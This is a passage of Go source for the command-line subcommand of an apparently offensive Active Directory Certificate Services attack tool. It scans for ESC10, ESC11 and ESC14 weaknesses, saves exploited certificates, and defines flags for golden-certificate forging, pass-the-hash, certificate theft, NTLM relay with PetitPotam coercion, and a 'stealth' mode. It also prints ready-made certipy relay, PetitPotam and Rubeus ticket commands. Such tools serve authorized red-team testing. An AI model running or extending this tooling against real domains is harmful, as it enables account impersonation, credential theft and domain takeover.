			return fmt.Errorf("ESC10 scan failed: %w", scanErr)
		}
		if len(esc10Findings) == 0 {
			fmt.Println("[*] No weak certificate mapping configurations found (ESC10).")
			return nil
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc10Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		for _, f := range esc10Findings {
			fmt.Println("\n[!] ESC10 — Weak certificate mapping detected:")
			fmt.Printf("    CertificateMappingMethods: 0x%x\n", f.MappingMethods)
			fmt.Printf("    UPN Mapping Enabled: %v\n", f.UPNMappingEnabled)
			fmt.Printf("    S4U2Self Enabled: %v\n", f.S4U2SelfEnabled)
			fmt.Printf("    StrongCertificateBindingEnforcement: %d\n", f.BindingEnforcement)
			if len(f.VulnerableTemplates) > 0 {
				fmt.Printf("    Vulnerable Templates: %s\n", strings.Join(f.VulnerableTemplates, ", "))
			}
		}
		fmt.Println("\n[*] Weak mapping allows certificate-based impersonation without strong binding.")
		fmt.Printf("    Exploit via ESC9: certstrike pki --esc 9 --template <TEMPLATE> --upn %s --attacker-dn <DN> --target-dc %s --domain %s -u <user> -p <pass>\n", upn, cfg.TargetDC, cfg.Domain)
		return nil
	case "11":
		// ESC11 is a CA-level finding — scan for RPC interfaces not enforcing encryption
		esc11Findings, scanErr := pki.ScanESC11(cfg)
		if scanErr != nil {
			return fmt.Errorf("ESC11 scan failed: %w", scanErr)
		}
		if len(esc11Findings) == 0 {
			fmt.Println("[*] No CAs with unencrypted RPC enrollment found (ESC11).")
			return nil
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc11Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		fmt.Println("\n[!] ESC11 — RPC enrollment without encryption enforcement:")
		for _, f := range esc11Findings {
			fmt.Printf("\n    CA: %s (%s)\n", f.CAName, f.CAHostname)
			fmt.Printf("    IF_ENFORCEENCRYPTICERTREQUEST: %v\n", f.EnforcesEncryption)
			fmt.Printf("    Flags: 0x%x\n", f.Flags)
		}
		fmt.Println("\n[*] RPC enrollment without encryption allows relay attacks via ICertPassage:")
		fmt.Printf("    certipy-ad relay -target rpc://<CA_HOST> -ca <CA_NAME> -template %s\n", templateName)
		fmt.Printf("    # Then coerce auth: PetitPotam.py <LISTENER_IP> %s\n", cfg.TargetDC)
		return nil
	case "14":
		// ESC14 is a template+domain config finding — scan for weak explicit mappings
		esc14Findings, scanErr := pki.ScanESC14(cfg)
		if scanErr != nil {
			return fmt.Errorf("ESC14 scan failed: %w", scanErr)
		}
		if len(esc14Findings) == 0 {
			fmt.Println("[*] No templates vulnerable to weak explicit mapping found (ESC14).")
			return nil
		}
		if cfg.OutputJSON {
			data, _ := json.MarshalIndent(esc14Findings, "", "  ")
			fmt.Println(string(data))
			return nil
		}
		fmt.Println("\n[!] ESC14 — Weak explicit certificate mapping:")
		for _, f := range esc14Findings {
			fmt.Printf("\n    Template: %s\n", f.TemplateName)
			fmt.Printf("    Schema Version: %d\n", f.SchemaVersion)
			fmt.Printf("    Allows Explicit Mapping: %v\n", f.AllowsExplicitMapping)
			fmt.Printf("    Strong Mapping Required: %v\n", f.StrongMappingRequired)
			fmt.Printf("    StrongCertificateBindingEnforcement: %d\n", f.BindingEnforcement)
		}
		fmt.Println("\n[*] Weak explicit mapping allows certificate-to-account binding manipulation.")
		fmt.Printf("    Combined with write access to altSecurityIdentities, this enables impersonation.\n")
		return nil
	default:
		return fmt.Errorf("unsupported ESC: %s (supported: 1-14)", exploit)
	}

	if err != nil {
		return fmt.Errorf("exploitation failed: %w", err)
	}

	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	basePath := output
	for _, ext := range []string{".pem", ".crt", ".key", ".pfx"} {
		basePath = strings.TrimSuffix(basePath, ext)
	}

	// Always write PEM files
	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
		return fmt.Errorf("write cert: %w", err)
	}
	// Also write PFX for direct certipy/Rubeus use
	pfxPath := basePath + ".pfx"
	if err := pki.WritePFX(cert, certKey, pfxPath, pfxPassword); err != nil {
		fmt.Printf("[!] PFX export failed: %v\n", err)
	}

	if cfg.OutputJSON {
		result := pki.ExploitResult{
			Exploit:   strings.ToUpper(exploit),
			Template:  templateName,
			TargetUPN: upn,
			CertPath:  basePath + ".crt",
			KeyPath:   basePath + ".key",
			PFXPath:   basePath + ".pfx",
			Success:   true,
		}
		data, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	// Detect whether we got a CA-signed cert or fell back to self-signed
	selfSigned := cert.Issuer.CommonName == cert.Subject.CommonName

	if selfSigned {
		fmt.Printf("\n[!] OFFLINE MODE — certificate is self-signed (CA enrollment failed)\n")
		fmt.Printf("    This cert will NOT authenticate against a real domain controller.\n")
		fmt.Printf("    To get a CA-signed cert, ensure the CA's web enrollment (/certsrv/) is reachable.\n")
	} else {
		fmt.Printf("\n[+] Exploitation successful — CA-signed certificate obtained!\n")
	}
	fmt.Printf("    Exploit:  ESC%s\n", escID)
	fmt.Printf("    Template: %s\n", templateName)
	fmt.Printf("    UPN:      %s\n", upn)
	fmt.Printf("    Issuer:   %s\n", cert.Issuer.CommonName)
	fmt.Printf("    Files:    %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
	if !selfSigned {
		fmt.Printf("\n[*] Authenticate with the certificate:\n")
		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n", pfxPath, cfg.Domain)
		sam := upn
		if idx := strings.Index(sam, "@"); idx > 0 {
			sam = sam[:idx]
		}
		rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /ptt", sam, pfxPath)
		if pfxPassword != "" {
			rubeusCmd += fmt.Sprintf(" /password:%s", pfxPassword)
		}
		fmt.Printf("    %s\n", rubeusCmd)
	}
	return nil
}

func runAutoDetect(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
	}

	vulnerable, err := pki.AutoDetectESC(cfg)
	if err != nil {
		return fmt.Errorf("auto-detect: %w", err)
	}

	if len(vulnerable) == 0 {
		fmt.Println("[*] No vulnerable templates detected.")
		return nil
	}

	fmt.Printf("\n[+] Found %d vulnerable template(s) — prioritized attack paths:\n\n", len(vulnerable))
	for i, t := range vulnerable {
		fmt.Printf("  %d. [Score: %d] %s\n", i+1, t.ESCScore, t.Name)
		fmt.Printf("     Vulnerabilities: %s\n", strings.Join(t.ESCVulns, ", "))
		if t.EnrolleeSuppliesSubject {
			fmt.Println("     → Enrollee can supply subject (critical for impersonation)")
		}
		if t.AuthenticationEKU {
			fmt.Println("     → Has authentication EKU (can be used for domain auth)")
		}
		fmt.Println()
	}
	return nil
}

func runImportPFX(cmd *cobra.Command, pfxPath string) error {
	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
	outputJSON, _ := cmd.Flags().GetBool("json")

	if outputJSON {
		info, err := pki.LoadPFXInfo(pfxPath, pfxPassword)
		if err != nil {
			return fmt.Errorf("load PFX: %w", err)
		}
		data, err := json.MarshalIndent(info, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal JSON: %w", err)
		}
		fmt.Println(string(data))
		return nil
	}

	_, _, err := pki.LoadPFX(pfxPath, pfxPassword)
	if err != nil {
		return fmt.Errorf("load PFX: %w", err)
	}
	return nil
}

func runReport(cmd *cobra.Command) error {
	cfg := buildADCSConfig(cmd)
	if cfg.TargetDC == "" || cfg.Domain == "" {
		return fmt.Errorf("--target-dc and --domain are required for report generation")
	}
	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
	}

	reportFormat, _ := cmd.Flags().GetString("format")
	if reportFormat == "" {
		reportFormat = "markdown"
	}

	output, _ := cmd.Flags().GetString("output")
	if output == "" {
		output = "findings.md"
	}

	fmt.Printf("[*] Running full ADCS enumeration for report...\n")
	result, err := pki.EnumerateAll(cfg)
	if err != nil {
		return fmt.Errorf("enumeration failed: %w", err)
	}

	reportData, err := pki.GenerateReport(result, reportFormat)
	if err != nil {
		return fmt.Errorf("generate report: %w", err)
	}

	if err := os.WriteFile(output, reportData, 0600); err != nil {
		return fmt.Errorf("write report: %w", err)
	}

	fmt.Printf("[+] Report written to %s (%d bytes)\n", output, len(reportData))
	fmt.Printf("    Format:    %s\n", reportFormat)
	fmt.Printf("    Templates: %d\n", len(result.Templates))
	fmt.Printf("    Findings:  %d\n", result.VulnCount)
	return nil
}

func init() {
	rootCmd.AddCommand(pkiCmd)

	// Action flags
	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
	pkiCmd.Flags().String("esc", "", "Exploit ESC vulnerability (1-14, e.g. --esc 1)")
	pkiCmd.Flags().String("exploit", "", "Alias for --esc")
	pkiCmd.Flags().MarkHidden("exploit")
	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
	pkiCmd.Flags().String("import-pfx", "", "Import and display info from a PKCS12/PFX file")
	pkiCmd.Flags().Bool("report", false, "Generate engagement report from full ADCS enumeration")
	pkiCmd.Flags().String("theft", "", "Certificate theft playbook (1-5 or all)")
	pkiCmd.Flags().String("cert-theft", "", "Alias for --theft")
	pkiCmd.Flags().MarkHidden("cert-theft")

	// Connection flags
	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
	pkiCmd.Flags().String("domain", "", "Active Directory domain name")
	pkiCmd.Flags().StringP("username", "u", "", "Domain username (user or user@domain)")
	pkiCmd.Flags().StringP("password", "p", "", "Domain password for LDAP authentication")
	pkiCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash authentication")
	pkiCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication (GSSAPI/SPNEGO)")
	pkiCmd.Flags().String("ccache", "", "Path to Kerberos ccache file (default: KRB5CCNAME env)")
	pkiCmd.Flags().String("keytab", "", "Path to Kerberos keytab file")
	pkiCmd.Flags().String("dc-ip", "", "KDC IP address (if different from --target-dc)")
	pkiCmd.Flags().Bool("ldaps", false, "Use LDAPS (port 636)")
	pkiCmd.Flags().Bool("start-tls", false, "Use StartTLS (upgrade plaintext LDAP to TLS)")

	// Certificate flags
	pkiCmd.Flags().String("upn", "", "User Principal Name for certificate forging")
	pkiCmd.Flags().String("ca-key", "", "Path to CA private key PEM file")
	pkiCmd.Flags().String("ca-cert", "", "Path to CA certificate PEM file (with --ca-key, enables golden certificate mode)")
	pkiCmd.Flags().String("template", "", "Certificate template name for exploitation")
	pkiCmd.Flags().String("pfx-password", "", "Password for PFX archive (default: empty/unencrypted)")
	pkiCmd.Flags().String("ca", "", "Target CA name for ESC7 exploitation")
	pkiCmd.Flags().String("attacker-dn", "", "Attacker sAMAccountName or LDAP DN for ESC9 (e.g., 'attacker' — DN auto-built from --domain)")
	pkiCmd.Flags().String("listener-ip", "", "Attacker relay listener IP for ESC8/ESC11 (triggers PetitPotam coercion)")
	pkiCmd.Flags().Int("listener-port", 0, "Relay listener port (>1024 for non-admin pivot; uses WebDAV/HTTP instead of SMB)")

	// Output flags
	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
	pkiCmd.Flags().Bool("json", false, "Output results as JSON instead of human-readable text")
	pkiCmd.Flags().String("format", "markdown", "Report format (markdown)")

	// Operational flags
	pkiCmd.Flags().Bool("stealth", false, "Enable stealth mode: random delays between queries, smaller page sizes")
}
